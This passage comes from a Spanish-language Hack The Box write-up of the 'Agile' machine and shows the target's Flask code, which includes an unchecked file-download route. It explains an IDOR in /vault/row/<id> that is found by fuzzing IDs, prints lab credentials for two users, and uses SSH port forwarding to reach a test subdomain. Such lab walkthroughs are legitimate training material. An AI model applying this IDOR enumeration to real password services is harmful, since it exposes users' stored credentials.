-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flask&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'vault/partials/password_row.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-
-&lt;span class=&quot;nd&quot;&gt;@blueprint.post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/vault/update/&amp;lt;id&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;template_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'vault/partials/password_row.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@login_required&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flask&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;site&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'url'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;site&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;flask&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password_service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update_password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;site&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;p&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-
-&lt;span class=&quot;nd&quot;&gt;@blueprint.delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/vault/delete/&amp;lt;id&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@login_required&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;password_service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delete_password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
-
-
-&lt;span class=&quot;nd&quot;&gt;@blueprint.get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/vault/export'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@login_required&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;export&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;has_passwords&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;        
-        &lt;span class=&quot;n&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password_service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generate_csv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flask&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/download?fn={fn}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;302&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;No passwords for user&quot;&lt;/span&gt;
-    
-
-&lt;span class=&quot;nd&quot;&gt;@blueprint.get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/download'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@login_required&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;download&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flask&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'fn'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/tmp/{fn}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'rb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flask&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;make_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Content-Disposition'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'attachment; filename=superpass_export.csv'&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mimetype&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'text/csv'&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;idor&quot;&gt;IDOR&lt;/h2&gt;
-
-&lt;p&gt;Basicamente IDOR es una vulnerabilidad en la cual el atacante puede acceder directamente a objetos (funciones, archivos, datos, etc) de acuerdo al input que haya ingresado. Vamos a analizar el codigo y te dire por que este sitio web es vulnerable&lt;/p&gt;
-
-&lt;p&gt;Observa que cuando se accede a la ruta &lt;code class=&quot;highlighter-rouge&quot;&gt;/vault&lt;/code&gt; se manda a llamar a la funcion &lt;code class=&quot;highlighter-rouge&quot;&gt;vault&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@blueprint.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/vault'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;template_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'vault/vault.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@login_required&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;vault&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password_service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_passwords_for_user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'{passwords=}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'passwords'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Esta funcion lo que hace es obtener las contraseñas de acuerdo al ID, se usa &lt;code class=&quot;highlighter-rouge&quot;&gt;get_passwords_for_user&lt;/code&gt; para obtener las credenciales del usuario, y observa que recibe este parametro &lt;code class=&quot;highlighter-rouge&quot;&gt;current_user.id&lt;/code&gt;, lo que significa que obtiene el ID del usuario actual que esta autenticado, y despues esas contraseñas las manda a imprimir en el &lt;code class=&quot;highlighter-rouge&quot;&gt;print&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;La parte interesante esta en esta funcion:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@blueprint.get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/vault/row/&amp;lt;id&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;template_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'vault/partials/password_row.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@login_required&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password_service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_password_by_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;p&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Observa que ahora se le pasa esta ruta &lt;code class=&quot;highlighter-rouge&quot;&gt;/vault/row/&amp;lt;id&amp;gt;&lt;/code&gt; la cual recibe un ID, y en caso de proporcionarle un ID y toda esa ruta sea correcta entonces se manda a llamar a &lt;code class=&quot;highlighter-rouge&quot;&gt;get_row&lt;/code&gt; la cual recibe un ID, el cual es el que se le pasa por la URL y lo que estaria pasando en la funcion &lt;code class=&quot;highlighter-rouge&quot;&gt;get_row&lt;/code&gt; es obtener la contraseña del usuario asociado a ese ID.&lt;/p&gt;
-
-&lt;p&gt;¿Entonces por que es vulnerable?, cuando ingresamos a la URL &lt;code class=&quot;highlighter-rouge&quot;&gt;http://superpass.htb/vault/row/&lt;/code&gt; indicandole un ID valido al final, nos mostrara las credenciales de un usuario como se ve aca&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/agile/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Entonces lo que esta pasando es que podemos acceder directamente al objeto que tiene las contraseñas de acuerdo a nuestro input, el cual es el ID, y por eso es vulneable a IDOR, ahora, para saber cual ID es valido o no, puedes crear un diccionario de IDs y luego usar WFUZZ o gobuster para fuzzer por los ID, tambien puedes crearte un script de python que vaya probando los ID, o lo puedes hacer manual, simplemente en la URL le vas cambiando el ID y si cuela cuela, y bueno, te adelando que despues de fuzzear, encontre las credenciales de un usuario llamado corum con el ID 7&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;usr: corum&lt;/li&gt;
-  &lt;li&gt;pass: 5db7caa1d13cc37c9fc2&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Ingresamos por SSH y ya somos curum y tenemos la flag de user&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/agile/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;corum-a-edwards&quot;&gt;Corum a Edwards&lt;/h2&gt;
-
-&lt;p&gt;Si ponemos el comando &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; para ver que podemos ejecutar como root, nos mostrara que no podemos ejecutar nada como root:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;corum@agile:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;corum: 
-Sorry, user corum may not run &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;on agile.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Si mostramos los puertos abiertos y conexiones establecidas con el comando &lt;code class=&quot;highlighter-rouge&quot;&gt;netstat -a&lt;/code&gt; vamos a ver puertos interesantes&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Active Internet connections &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;servers and established&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Proto Recv-Q Send-Q Local Address           Foreign Address         State      
-tcp        0      0 localhost:mysql         0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN     
-tcp        0      0 localhost:5555          0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN     
-tcp        0      0 localhost:domain        0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN     
-tcp        0      0 localhost:53409         0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN     
-tcp        0      0 localhost:33060         0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN     
-tcp        0      0 0.0.0.0:ssh             0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN     
-tcp        0      0 0.0.0.0:http            0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN     
-tcp        0      0 localhost:5000          0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN     
-tcp        0      0 localhost:41829         0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN     
-tcp        0      0 localhost:39900         localhost:53409         ESTABLISHED
-tcp      150      0 localhost:46212         localhost:mysql         CLOSE_WAIT 
-tcp      150      0 localhost:57136         localhost:mysql         CLOSE_WAIT 
-tcp        0      0 localhost:48964         localhost:41829         ESTABLISHED
-tcp        0      0 localhost:48972         localhost:41829         ESTABLISHED
-tcp        0      0 localhost:53409         localhost:39900         ESTABLISHED
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;El puerto 5555, 5000 y 41829, asi que podriamos hacer por forwarding para traernos uno de esos puertos, pero antes de eso decidi mostrar el &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; para ver si hay algo mas, y vamos a poder ver cosas:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;corum@agile:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/hosts
-127.0.0.1 localhost superpass.htb test.superpass.htb
-127.0.1.1 agile
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Tenemos el dominio &lt;code class=&quot;highlighter-rouge&quot;&gt;superpass.htb&lt;/code&gt; y el subdominio &lt;code class=&quot;highlighter-rouge&quot;&gt;test.superpass.htb&lt;/code&gt;, sabiendo eso ya podemos hacer port forwarding del puerto 5555&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 8080:127.0.0.1:5555 corum@superpass.htb
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Despues en mi archivo /etc/hosts agrege los dominio que descubrimos, de esta forma&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;127.0.0.1  superpass.htb test.superpass.htb
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Al entrar el sitio web nos podemos dar cuenta que es lo mismo que el anterior sitio web&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/agile/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Aqui simplemente fue por intuicion, si es el mismo sitio web, entonces puedo probar el mismo IDOR para ver si hay credenciales de otro usuario, y en efecto, ahora en el ID 1 encontre las credenciales de &lt;code class=&quot;highlighter-rouge&quot;&gt;edwards&lt;/code&gt;: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://test.superpass.htb:8080/vault/row/1&lt;/code&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;usr: edwards&lt;/li&gt;
-  &lt;li&gt;pass: d07867c6267dcb5df0af&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;escalada&quot;&gt;Escalada&lt;/h2&gt;
-
